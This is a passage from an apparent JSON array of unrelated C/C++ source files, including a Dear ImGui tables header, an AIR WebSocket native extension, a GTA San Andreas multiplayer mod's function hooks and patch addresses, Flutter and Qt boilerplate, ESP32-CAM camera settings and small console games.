Faz Parte\",\r\n        \"Contatos e Aliados do Personagem\",\r\n        \"Confirmar a lista?\"\r\n    };\r\n    \r\n    std::string entradaUsuario;\r\n    std::string resultado;\r\n\r\n    std::cout << \"Crie a ficha do seu personagem:\\n\";\r\n\r\n    for (int i = 0; i < 40; ++i) {\r\n        std::cout << \"Linha \" << i + 1 << \": \" << predefinidos[i] << \" - \";\r\n        std::getline(std::cin, entradaUsuario);\r\n        resultado += \"Linha \" + std::to_string(i + 1) + \": \" + predefinidos[i] + \" - \" + entradaUsuario + \"\\n\";\r\n    }\r\n\r\n    std::cout << \"\\nVoc\u00ea digitou:\\n\" << resultado;\r\n\r\n    return 0;\r\n}\r\n\r\n",
    "// dear imgui, v1.90.2 WIP\n// (tables and columns code)\n\n/*\n\nIndex of this file:\n\n// [SECTION] Commentary\n// [SECTION] Header mess\n// [SECTION] Tables: Main code\n// [SECTION] Tables: Simple accessors\n// [SECTION] Tables: Row changes\n// [SECTION] Tables: Columns changes\n// [SECTION] Tables: Columns width management\n// [SECTION] Tables: Drawing\n// [SECTION] Tables: Sorting\n// [SECTION] Tables: Headers\n// [SECTION] Tables: Context Menu\n// [SECTION] Tables: Settings (.ini data)\n// [SECTION] Tables: Garbage Collection\n// [SECTION] Tables: Debugging\n// [SECTION] Columns, BeginColumns, EndColumns, etc.\n\n*/\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n//-----------------------------------------------------------------------------\n// [SECTION] Commentary\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// Typical tables call flow: (root level is generally public API):\n//-----------------------------------------------------------------------------\n// - BeginTable()                               user begin into a table\n//    | BeginChild()                            - (if ScrollX/ScrollY is set)\n//    | TableBeginInitMemory()                  - first time table is used\n//    | TableResetSettings()                    - on settings reset\n//    | TableLoadSettings()                     - on settings load\n//    | TableBeginApplyRequests()               - apply queued resizing/reordering/hiding requests\n//    | - TableSetColumnWidth()                 - apply resizing width (for mouse resize, often requested by previous frame)\n//    |    - TableUpdateColumnsWeightFromWidth()- recompute columns weights (of stretch columns) from their respective width\n// - TableSetupColumn()                         user submit columns details (optional)\n// - TableSetupScrollFreeze()                   user submit scroll freeze information (optional)\n//-----------------------------------------------------------------------------\n// - TableUpdateLayout() [Internal]             followup to BeginTable(): setup everything: widths, columns positions, clipping rectangles. Automatically called by the FIRST call to TableNextRow() or TableHeadersRow().\n//    | TableSetupDrawChannels()                - setup ImDrawList channels\n//    | TableUpdateBorders()                    - detect hovering columns for resize, ahead of contents submission\n//    | TableBeginContextMenuPopup()\n//    | - TableDrawDefaultContextMenu()         - draw right-click context menu contents\n//-----------------------------------------------------------------------------\n// - TableHeadersRow() or TableHeader()         user submit a headers row (optional)\n//    | TableSortSpecsClickColumn()             - when left-clicked: alter sort order and sort direction\n//    | TableOpenContextMenu()                  - when right-clicked: trigger opening of the default context menu\n// - TableGetSortSpecs()                        user queries updated sort specs (optional, generally after submitting headers)\n// - TableNextRow()                             user begin into a new row (also automatically called by TableHeadersRow())\n//    | TableEndRow()                           - finish existing row\n//    | TableBeginRow()                         - add a new row\n// - TableSetColumnIndex() / TableNextColumn()  user begin into a cell\n//    | TableEndCell()                          - close existing column/cell\n//    | TableBeginCell()                        - enter into current column/cell\n// - [...]                                      user emit contents\n//-----------------------------------------------------------------------------\n// - EndTable()                                 user ends the table\n//    | TableDrawBorders()                      - draw outer borders, inner vertical borders\n//    | TableMergeDrawChannels()                - merge draw channels if clipping isn't required\n//    | EndChild()                              - (if ScrollX/ScrollY is set)\n//-----------------------------------------------------------------------------\n\n//-----------------------------------------------------------------------------\n// TABLE SIZING\n//-----------------------------------------------------------------------------\n// (Read carefully because this is subtle but it does make sense!)\n//-----------------------------------------------------------------------------\n// About 'outer_size':\n// Its meaning needs to differ slightly depending on if we are using ScrollX/ScrollY flags.\n// Default value is ImVec2(0.0f, 0.0f).\n//   X\n//   - outer_size.x <= 0.0f  ->  Right-align from window/work-rect right-most edge. With -FLT_MIN or 0.0f will align exactly on right-most edge.\n//  ",
    "#include \"log.h\"\n#ifdef WIN32\n#include <winsock2.h>\n#include <windows.h>\n#include <cstdint>\ntypedef unsigned __int32 uint32_t;\ntypedef unsigned __int8 uint8_t;\ntypedef __int32 int32_t;\n#endif\n#include \"library.h\"\n#include <WebSocketClient.h>\n#include <cstdio>\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {\n    switch (ul_reason_for_call) {\n        case DLL_PROCESS_ATTACH:\n            initLog();\n            writeLog(\"DLL loaded (DLL_PROCESS_ATTACH)\");\n            break;\n        case DLL_THREAD_ATTACH:\n            writeLog(\"DLL loaded (DLL_THREAD_ATTACH)\");\n            break;\n        case DLL_THREAD_DETACH:\n            writeLog(\"DLL unloaded (DLL_THREAD_DETACH)\");\n            break;\n        case DLL_PROCESS_DETACH:\n            writeLog(\"DLL unloaded (DLL_PROCESS_DETACH)\");\n            closeLog();\n            break;\n    }\n    return TRUE;\n}\n\nFREObject connectWebSocket(FREContext ctx, void *funcData, uint32_t argc, FREObject argv[]) {\n    writeLog(\"connectWebSocket called\");\n    if (argc < 1) return nullptr;\n\n    uint32_t uriLength;\n    const uint8_t *uri;\n    FREGetObjectAsUTF8(argv[0], &uriLength, &uri);\n\n    WebSocketClient *websocketClient = nullptr;\n    FREGetContextNativeData(ctx, reinterpret_cast<void **>(&websocketClient));\n\n    if (websocketClient != nullptr) {\n        websocketClient->close(boost::beast::websocket::close_code::abnormal, \"Reconnecting\");\n        delete websocketClient;\n    }\n\n    websocketClient = new WebSocketClient();\n    websocketClient->setFREContext(ctx);\n    FRESetContextNativeData(ctx, websocketClient);\n\n    websocketClient->connect(std::string(reinterpret_cast<const char *>(uri), uriLength));\n\n    return nullptr;\n}\n\nFREObject closeWebSocket(FREContext ctx, void *funcData, uint32_t argc, FREObject argv[]) {\n    writeLog(\"closeWebSocket called\");\n\n    WebSocketClient *websocketClient = nullptr;\n    FREGetContextNativeData(ctx, reinterpret_cast<void **>(&websocketClient));\n\n    if (websocketClient != nullptr) {\n        uint32_t closeCode = 1000; // Default close code\n        if (argc > 0) {\n            FREGetObjectAsUint32(argv[0], &closeCode);\n        }\n\n        auto beastCloseCode = static_cast<boost::beast::websocket::close_code>(closeCode);\n        websocketClient->close(beastCloseCode, \"Connection closed\");\n    }\n    return nullptr;\n}\n\nFREObject sendMessageWebSocket(FREContext ctx, void *funcData, uint32_t argc, FREObject argv[]) {\n    writeLog(\"sendMessageWebSocket called\");\n    if (argc < 2) return nullptr;\n\n    WebSocketClient *websocketClient = nullptr;\n    FREGetContextNativeData(ctx, reinterpret_cast<void **>(&websocketClient));\n\n    if (websocketClient == nullptr) return nullptr;\n\n    uint32_t messageType;\n    FREGetObjectAsUint32(argv[0], &messageType);\n\n    FREObjectType objectType;\n    FREGetObjectType(argv[1], &objectType);\n\n    if (objectType == FRE_TYPE_STRING) {\n        uint32_t payloadLength;\n        const uint8_t *payload;\n        FREGetObjectAsUTF8(argv[1], &payloadLength, &payload);\n\n        websocketClient->sendMessage(std::string(reinterpret_cast<const char *>(payload), payloadLength));\n    } else if (objectType == FRE_TYPE_BYTEARRAY) {\n        FREByteArray byteArray;\n        FREAcquireByteArray(argv[1], &byteArray);\n\n        const std::vector payload(byteArray.bytes, byteArray.bytes + byteArray.length);\n        websocketClient->sendMessage(payload);\n\n        FREReleaseByteArray(argv[1]);\n    }\n\n    return nullptr;\n}\n\nFREObject getByteArrayMessage(FREContext ctx, void *funcData, uint32_t argc, FREObject argv[]) {\n    writeLog(\"getByteArrayMessage called\");\n\n    WebSocketClient *websocketClient = nullptr;\n    FREGetContextNativeData(ctx, reinterpret_cast<void **>(&websocketClient));\n\n    if (websocketClient == nullptr) return nullptr;\n\n    const auto message = websocketClient->getNextMessage();\n\n    if (!message.has_value())\n        return nullptr;\n\n    auto vectorData = message.value();\n\n    FREObject byteArrayObject = nullptr;\n    if (!vectorData.empty()) {\n        FREByteArray byteArray;\n        byteArray.length = vectorData.size();\n        byteArray.bytes = vectorData.data();\n\n        FRENewByteArray(&byteArray, &byteArrayObject);\n    }\n\n    return byteArrayObject;\n}\n\nFREObject setDebugMode(FREContext ctx, void *funcData, uint32_t argc, FREObject argv[]) {\n    writeLog(\"setDebugMode called\");\n    if (argc < 1) return nullptr;\n\n    WebSocketClient *websocketClient = nullptr;\n    FREGetContextNativeData(ctx, reinterpret_cast<void **>(&websocketClient));\n\n    if (websocketClient == nullptr) return nullptr;\n\n    uint32_t debugMode;\n    FREGetObjectAsBool(argv[0], &debugMode);\n\n    websocketClient->setDebugMode(debugMode);\n\n    return nullptr;\n}\n\nvoid ContextInitializer(void *extData, const uint8_t *ctxType, FREContext ctx, uint32_t *numFunctionsToSet, const FRENamedFunction **functionsToSet) {\n    writeLog(\"ContextInitializer called\");\n    static FRENamedFunction arrFunctions[] = {\n        {reinterpret_cast<const uint8",
    "#include \"game.h\"\n#include \"scm.h\"\n#include \"utils.h\"\n#include \"network.h\"\n#include <intrin.h>\n#include \"chat.h\"\n#include \"renderer.h\"\n\n#pragma intrinsic(_ReturnAddress)\n\nSafetyHookInline CPopulationAddToPopulation_{};\nSafetyHookInline CRoadBlocksInit_{};\nSafetyHookInline RegisterScriptRoadBlock_{};\nSafetyHookInline CTheCarGeneratorsProcess_{};\nSafetyHookInline GenerateRandomCars_{};\nSafetyHookInline GenerateRoadBlocks_{};\nSafetyHookInline GenerateRoadBlockCopsForCar_{};\nSafetyHookInline CanPlayerStartMission_{};\nSafetyHookInline ReportCrime_{};\nSafetyHookInline OpenFile_{};\nSafetyHookInline CGameShutdown_{};\nSafetyHookInline CPedIntelligenceProcess_{};\nSafetyHookInline CPopulationRemovePed_{};\nSafetyHookInline CPopulationManagePed_{};\n\nchar __cdecl CPopulationAddToPopulation(float a1, float a2, float a3, float a4) {\n\treturn 0;\n}\n\nvoid __cdecl CTheCarGeneratorsProcess() {\n\treturn;\n}\n\nvoid __cdecl GenerateRandomCars() {\n\treturn;\n}\n\nvoid __cdecl GenerateRoadBlocks() {\n\treturn;\n}\n\nvoid __cdecl CRoadBlocksInit() {\n\treturn;\n}\n\nchar __cdecl GenerateRoadBlockCopsForCar(CVehicle* a1, int ped_pos_type, int type) {\n\treturn 0;\n}\n\nvoid __cdecl RegisterScriptRoadBlock(RwV3d cornerA, RwV3d cornerB, unsigned __int8 type) {\n\treturn;\n}\n\nbool __fastcall CanPlayerStartMission(void* _this) {\n\treturn false;\n}\n\nvoid __cdecl ReportCrime(int crime, CPed* victim, CPed* suspect) {\n\treturn;\n}\n\nvoid __cdecl CGameShutdown() {\n\tif (network::is_connected())\n\t\tnetwork::disconnect();\n\tnetwork::shutdown();\n\n\tstatic auto path = get_documents_path();\n\tif (!path.string().contains(\"main.scm\"))\n\t\tpath.append(\"main.scm\");\n\n\tif (std::filesystem::exists(path))\n\t\tstd::filesystem::remove(path);\n\tCGameShutdown_.call<void>();\n}\n\nvoid __cdecl CPopulationRemovePed(CPed* ped) {\n\tCPopulationRemovePed_.call<void>(ped);\n}\nvoid __cdecl CPopulationManagePed(CPed* ped, CVector* playerPos) {\n\n\tif (ped == FindPlayerPed()) {\n\t\tCPopulationManagePed_.call<void>(ped);\n\t\treturn;\n\t}\n\n\tif (get_distance(ped->GetPosition()) > 249) {\n\t\tprintf(\"manage ped\\n\");\n\t\tCPopulationManagePed_.call<void>(ped);\n\t}\n}\n\nstd::chrono::time_point<std::chrono::system_clock> sinceLastCall;\n\nstd::filesystem::path write_scm_to_docs()\n{\n\tstatic auto path = get_documents_path();\n\tpath.append(\"main.scm\");\n\n\tauto file = fopen(path.string().c_str(), \"wb\");\n\tfwrite(strippedSCM, 1, 2011, file);\n\tfclose(file);\n\n\treturn path;\n}\n\nFILE* __cdecl _OpenFile(const char* file, const char* mode) {\n\tif (std::string(file).contains(\"scm\")) {\n\n\t\tstatic auto path = get_documents_path();\n\t\tif (!path.string().contains(\"main.scm\"))\n\t\t\tpath.append(\"main.scm\");\n\n\t\twrite_scm_to_docs();\n\n\t\tsinceLastCall = std::chrono::system_clock::now();\n\t\treturn OpenFile_.call<FILE*>(path.string().c_str(), mode);\n\t}\n\n\treturn OpenFile_.call<FILE*>(file, mode);\n}\n\nDWORD __fastcall CPedIntelligenceProcess(CPedIntelligence* _this) {\n\tif (_this->m_pPed == FindPlayerPed())\n\t\treturn CPedIntelligenceProcess_.call<DWORD>(_this);\n\treturn 0;\n}\n\nunsigned char ScanListMemory[8 * 20000];\n\nDWORD dwPatchAddrScanReloc1USA[13] = {\n0x5DC7AA,0x41A85D,0x41A864,0x408259,0x711B32,0x699CF8,\n0x4092EC,0x408702,0x564220,0x564172,0x563845,\n0x84E9C2,0x85652D };\n\nDWORD dwPatchAddrScanReloc1EU[13] = {\n0x5DC7AA,0x41A85D,0x41A864,0x408261,0x711B32,0x699CF8,\n0x4092EC,0x408702,0x564220,0x564172,0x563845,\n0x84EA02,0x85656D };\n\nDWORD dwPatchAddrScanReloc2USA[56] = {\n0x0040D68C,0x005664D7,0x00566586,0x00408706,0x0056B3B1,0x0056AD91,0x0056A85F,0x005675FA,\n0x0056CD84,0x0056CC79,0x0056CB51,0x0056CA4A,0x0056C664,0x0056C569,0x0056C445,0x0056C341,\n0x0056BD46,0x0056BC53,0x0056BE56,0x0056A940,0x00567735,0x00546738,0x0054BB23,0x006E31AA,\n0x0040DC29,0x00534A09,0x00534D6B,0x00564B59,0x00564DA9,0x0067FF5D,0x00568CB9,0x00568EFB,\n0x00569F57,0x00569537,0x00569127,0x0056B4B5,0x0056B594,0x0056B2C3,0x0056AF74,0x0056AE95,\n0x0056BF4F,0x0056ACA3,0x0056A766,0x0056A685,0x0070B9BA,0x0056479D,0x0070ACB2,0x006063C7,\n0x00699CFE,0x0041A861,0x0040E061,0x0040DF5E,0x0040DDCE,0x0040DB0E,0x0040D98C,0x01566855 };\n\nDWORD dwPatchAddrScanReloc2EU[56] = {\n0x0040D68C,0x005664D7,0x00566586,0x00408706,0x0056B3B1,0x0056AD91,0x0056A85F,0x005675FA,\n0x0056CD84,0x0056CC79,0x0056CB51,0x0056CA4A,0x0056C664,0x0056C569,0x0056C445,0x0056C341,\n0x0056BD46,0x0056BC53,0x0056BE56,0x0056A940,0x00567735,0x00546738,0x0054BB23,0x006E31AA,\n0x0040DC29,0x00534A09,0x00534D6B,0x00564B59,0x00564DA9,0x0067FF5D,0x00568CB9,0x00568EFB,\n0x00569F57,0x00569537,0x00569127,0x0056B4B5,0x0056B594,0x0056B2C3,0x0056AF74,0x0056AE95,\n0x0056BF4F,0x0056ACA3,0x0056A766,0x0056A685,0x0070B9BA,0x0056479D,0x0070ACB2,0x006063C7,\n0x00699CFE,0x0041A861,0x0040E061,0x0040DF5E,0x0040DDCE,0x0040DB0E,0x0040D98C,0x01566845 };\n\nDWORD dwPatchAddrScanReloc3[11] = {\n0x004091C5,0x00409367,0x0040D9C5,0x0040DB47,0x0040DC61,0x0040DE07,0x0040DF97,\n0x0040E09A,0x00534A98,0x00534DFA,0x0071CDB0 };\n\nDWORD dwPatchAddrScanRelocEnd[4] = { 0x005634A6, 0x005638DF, 0x0056420F, 0x00564283 };\n\n\n//-----------------------------------------------------------\n\nvoid RelocateScanListHack() // patc",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"quiz\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "/****************************************************************************\n** Meta object code from reading C++ file 'mainwindow.h'\n**\n** Created by: The Qt Meta Object Compiler version 68 (Qt 6.7.2)\n**\n** WARNING! All changes made in this file will be lost!\n*****************************************************************************/\n\n#include \"../../../ui/mainwindow.h\"\n#include <QtCore/qmetatype.h>\n\n#include <QtCore/qtmochelpers.h>\n\n#include <memory>\n\n\n#include <QtCore/qxptype_traits.h>\n#if !defined(Q_MOC_OUTPUT_REVISION)\n#error \"The header file 'mainwindow.h' doesn't include <QObject>.\"\n#elif Q_MOC_OUTPUT_REVISION != 68\n#error \"This file was generated using the moc from 6.7.2. It\"\n#error \"cannot be used with the include files from this version of Qt.\"\n#error \"(The moc has changed too much.)\"\n#endif\n\n#ifndef Q_CONSTINIT\n#define Q_CONSTINIT\n#endif\n\nQT_WARNING_PUSH\nQT_WARNING_DISABLE_DEPRECATED\nQT_WARNING_DISABLE_GCC(\"-Wuseless-cast\")\nnamespace {\n\n#ifdef QT_MOC_HAS_STRINGDATA\nstruct qt_meta_stringdata_CLASSMainWindowENDCLASS_t {};\nconstexpr auto qt_meta_stringdata_CLASSMainWindowENDCLASS = QtMocHelpers::stringData(\n    \"MainWindow\",\n    \"to_set_connection\",\n    \"\",\n    \"check_placement\",\n    \"abort\",\n    \"ready_to_play\",\n    \"shot_fired\",\n    \"on_start_clicked\",\n    \"on_back_clicked\",\n    \"on_play_clicked\",\n    \"button_play_field_clicked\",\n    \"start_game\",\n    \"wait_setup\",\n    \"get_play_parameters\",\n    \"on_back2_clicked\",\n    \"forced_abort\"\n);\n#else  // !QT_MOC_HAS_STRINGDATA\n#error \"qtmochelpers.h not found or too old.\"\n#endif // !QT_MOC_HAS_STRINGDATA\n} // unnamed namespace\n\nQ_CONSTINIT static const uint qt_meta_data_CLASSMainWindowENDCLASS[] = {\n\n // content:\n      12,       // revision\n       0,       // classname\n       0,    0, // classinfo\n      14,   14, // methods\n       0,    0, // properties\n       0,    0, // enums/sets\n       0,    0, // constructors\n       0,       // flags\n       5,       // signalCount\n\n // signals: name, argc, parameters, tag, flags, initial metatype offsets\n       1,    0,   98,    2, 0x06,    1 /* Public */,\n       3,    0,   99,    2, 0x06,    2 /* Public */,\n       4,    0,  100,    2, 0x06,    3 /* Public */,\n       5,    0,  101,    2, 0x06,    4 /* Public */,\n       6,    0,  102,    2, 0x06,    5 /* Public */,\n\n // slots: name, argc, parameters, tag, flags, initial metatype offsets\n       7,    0,  103,    2, 0x0a,    6 /* Public */,\n       8,    0,  104,    2, 0x0a,    7 /* Public */,\n       9,    0,  105,    2, 0x0a,    8 /* Public */,\n      10,    0,  106,    2, 0x0a,    9 /* Public */,\n      11,    0,  107,    2, 0x0a,   10 /* Public */,\n      12,    0,  108,    2, 0x0a,   11 /* Public */,\n      13,    0,  109,    2, 0x0a,   12 /* Public */,\n      14,    0,  110,    2, 0x0a,   13 /* Public */,\n      15,    0,  111,    2, 0x0a,   14 /* Public */,\n\n // signals: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n // slots: parameters\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n    QMetaType::Void,\n\n       0        // eod\n};\n\nQ_CONSTINIT const QMetaObject MainWindow::staticMetaObject = { {\n    QMetaObject::SuperData::link<QMainWindow::staticMetaObject>(),\n    qt_meta_stringdata_CLASSMainWindowENDCLASS.offsetsAndSizes,\n    qt_meta_data_CLASSMainWindowENDCLASS,\n    qt_static_metacall,\n    nullptr,\n    qt_incomplete_metaTypeArray<qt_meta_stringdata_CLASSMainWindowENDCLASS_t,\n        // Q_OBJECT / Q_GADGET\n        QtPrivate::TypeAndForceComplete<MainWindow, std::true_type>,\n        // method 'to_set_connection'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'check_placement'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'abort'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'ready_to_play'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'shot_fired'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_start_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_back_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_play_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'button_play_field_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'start_game'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'wait_setup'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'get_play_parameters'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'on_back2_clicked'\n        QtPrivate::TypeAndForceComplete<void, std::false_type>,\n        // method 'forced_abort'\n    ",
    "#include \"OV2640.h\"\n\n#define TAG \"OV2640\"\n\n// definitions appropriate for the ESP32-CAM devboard (and most clones)\ncamera_config_t esp32cam_config{\n\n    .pin_pwdn = -1, // FIXME: on the TTGO T-Journal I think this is GPIO 0\n    .pin_reset = 15,\n\n    .pin_xclk = 27,\n\n    .pin_sscb_sda = 25,\n    .pin_sscb_scl = 23,\n\n    .pin_d7 = 19,\n    .pin_d6 = 36,\n    .pin_d5 = 18,\n    .pin_d4 = 39,\n    .pin_d3 = 5,\n    .pin_d2 = 34,\n    .pin_d1 = 35,\n    .pin_d0 = 17,\n    .pin_vsync = 22,\n    .pin_href = 26,\n    .pin_pclk = 21,\n    .xclk_freq_hz = 20000000,\n    .ledc_timer = LEDC_TIMER_0,\n    .ledc_channel = LEDC_CHANNEL_0,\n    .pixel_format = PIXFORMAT_JPEG,\n    // .frame_size = FRAMESIZE_UXGA, // needs 234K of framebuffer space\n    // .frame_size = FRAMESIZE_SXGA, // needs 160K for framebuffer\n    // .frame_size = FRAMESIZE_XGA, // needs 96K or even smaller FRAMESIZE_SVGA - can work if using only 1 fb\n    .frame_size = FRAMESIZE_SVGA,\n    .jpeg_quality = 12, //0-63 lower numbers are higher quality\n    .fb_count = 2       // if more than one i2s runs in continous mode.  Use only with jpeg\n};\n\ncamera_config_t esp32cam_aithinker_config{\n\n    .pin_pwdn = 32,\n    .pin_reset = -1,\n\n    .pin_xclk = 0,\n\n    .pin_sscb_sda = 26,\n    .pin_sscb_scl = 27,\n\n    // Note: LED GPIO is apparently 4 not sure where that goes\n    // per https://github.com/donny681/ESP32_CAMERA_QR/blob/e4ef44549876457cd841f33a0892c82a71f35358/main/led.c\n    .pin_d7 = 35,\n    .pin_d6 = 34,\n    .pin_d5 = 39,\n    .pin_d4 = 36,\n    .pin_d3 = 21,\n    .pin_d2 = 19,\n    .pin_d1 = 18,\n    .pin_d0 = 5,\n    .pin_vsync = 25,\n    .pin_href = 23,\n    .pin_pclk = 22,\n    .xclk_freq_hz = 20000000,\n    .ledc_timer = LEDC_TIMER_1,\n    .ledc_channel = LEDC_CHANNEL_1,\n    .pixel_format = PIXFORMAT_JPEG,\n    // .frame_size = FRAMESIZE_UXGA, // needs 234K of framebuffer space\n    // .frame_size = FRAMESIZE_SXGA, // needs 160K for framebuffer\n    // .frame_size = FRAMESIZE_XGA, // needs 96K or even smaller FRAMESIZE_SVGA - can work if using only 1 fb\n    .frame_size = FRAMESIZE_SVGA,\n    .jpeg_quality = 12, //0-63 lower numbers are higher quality\n    .fb_count = 2       // if more than one i2s runs in continous mode.  Use only with jpeg\n};\n\ncamera_config_t esp32cam_ttgo_t_config{\n\n    .pin_pwdn = 26,\n    .pin_reset = -1,\n\n    .pin_xclk = 32,\n\n    .pin_sscb_sda = 13,\n    .pin_sscb_scl = 12,\n\n    .pin_d7 = 39,\n    .pin_d6 = 36,\n    .pin_d5 = 23,\n    .pin_d4 = 18,\n    .pin_d3 = 15,\n    .pin_d2 = 4,\n    .pin_d1 = 14,\n    .pin_d0 = 5,\n    .pin_vsync = 27,\n    .pin_href = 25,\n    .pin_pclk = 19,\n    .xclk_freq_hz = 20000000,\n    .ledc_timer = LEDC_TIMER_0,\n    .ledc_channel = LEDC_CHANNEL_0,\n    .pixel_format = PIXFORMAT_JPEG,\n    .frame_size = FRAMESIZE_SVGA,\n    .jpeg_quality = 12, //0-63 lower numbers are higher quality\n    .fb_count = 2       // if more than one i2s runs in continous mode.  Use only with jpeg\n};\n\nvoid OV2640::run(void)\n{\n    if (fb)\n        //return the frame buffer back to the driver for reuse\n        esp_camera_fb_return(fb);\n\n    fb = esp_camera_fb_get();\n}\n\nvoid OV2640::runIfNeeded(void)\n{\n    if (!fb)\n        run();\n}\n\nint OV2640::getWidth(void)\n{\n    runIfNeeded();\n    return fb->width;\n}\n\nint OV2640::getHeight(void)\n{\n    runIfNeeded();\n    return fb->height;\n}\n\nsize_t OV2640::getSize(void)\n{\n    runIfNeeded();\n    if (!fb)\n        return 0; // FIXME - this shouldn't be possible but apparently the new cam board returns null sometimes?\n    return fb->len;\n}\n\nuint8_t *OV2640::getfb(void)\n{\n    runIfNeeded();\n    if (!fb)\n        return NULL; // FIXME - this shouldn't be possible but apparently the new cam board returns null sometimes?\n\n    return fb->buf;\n}\n\nframesize_t OV2640::getFrameSize(void)\n{\n    return _cam_config.frame_size;\n}\n\nvoid OV2640::setFrameSize(framesize_t size)\n{\n    _cam_config.frame_size = size;\n}\n\npixformat_t OV2640::getPixelFormat(void)\n{\n    return _cam_config.pixel_format;\n}\n\nvoid OV2640::setPixelFormat(pixformat_t format)\n{\n    switch (format)\n    {\n    case PIXFORMAT_RGB565:\n    case PIXFORMAT_YUV422:\n    case PIXFORMAT_GRAYSCALE:\n    case PIXFORMAT_JPEG:\n        _cam_config.pixel_format = format;\n        break;\n    default:\n        _cam_config.pixel_format = PIXFORMAT_GRAYSCALE;\n        break;\n    }\n}\n\nesp_err_t OV2640::init(camera_config_t config)\n{\n    memset(&_cam_config, 0, sizeof(_cam_config));\n    memcpy(&_cam_config, &config, sizeof(config));\n\n    esp_err_t err = esp_camera_init(&_cam_config);\n    if (err != ESP_OK)\n    {\n        printf(\"Camera probe failed with error 0x%x\", err);\n        return err;\n    }\n    // ESP_ERROR_CHECK(gpio_install_isr_service(0));\n\n    return ESP_OK;\n}\n",
    "#include <iostream>\r\n#include <string>\r\n#include <stdlib.h>   \r\n#include <time.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    while (1) {\r\n        string rock, paper, scissor, input;\r\n        int rand1;\r\n        cout << \"Enter 'rock', 'paper', or 'scissor's': \";\r\n        cin >> input;\r\n        srand(time(NULL));\r\n        rand1 = rand() % 3 + 1;\r\n\r\n        if (input == \"rock\" && rand1 == 1) {\r\n            cout << \"Both the user and the computer selected rock. Tie\" << endl;\r\n        }\r\n        if (input == \"rock\" && rand1 == 2) {\r\n            cout << \"The user selected rock and the computer selected paper. You lose\" << endl;\r\n        }\r\n        if (input == \"rock\" && rand1 == 3) {\r\n            cout << \"The user selected rock and the computer selected scissor's. You win\" << endl;\r\n        }\r\n        if (input == \"paper\" && rand1 == 1) {\r\n            cout << \"The user selected paper and the computer selected rock. You win\" << endl;\r\n        }\r\n        if (input == \"paper\" && rand1 == 2) {\r\n            cout << \"The user selected paper and the computer selected paper. Tie\" << endl;\r\n        }\r\n        if (input == \"paper\" && rand1 == 3) {\r\n            cout << \"The user selected paper and the computer selected scissor's. You lose\" << endl;\r\n        }\r\n        if (input == \"scissor's\" && rand1 == 1) {\r\n            cout << \"The user selected scissor's and the computer selected rock. You lose\" << endl;\r\n        }\r\n        if (input == \"scissor's\" && rand1 == 2) {\r\n            cout << \"The user selected scissor's and the computer selected paper. You win\" << endl;\r\n        }\r\n        if (input == \"scissor's\" && rand1 == 3) {\r\n            cout << \"The user selected scissor's and the computer selected scissor's. Tie\" << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n\r\n\r\n",
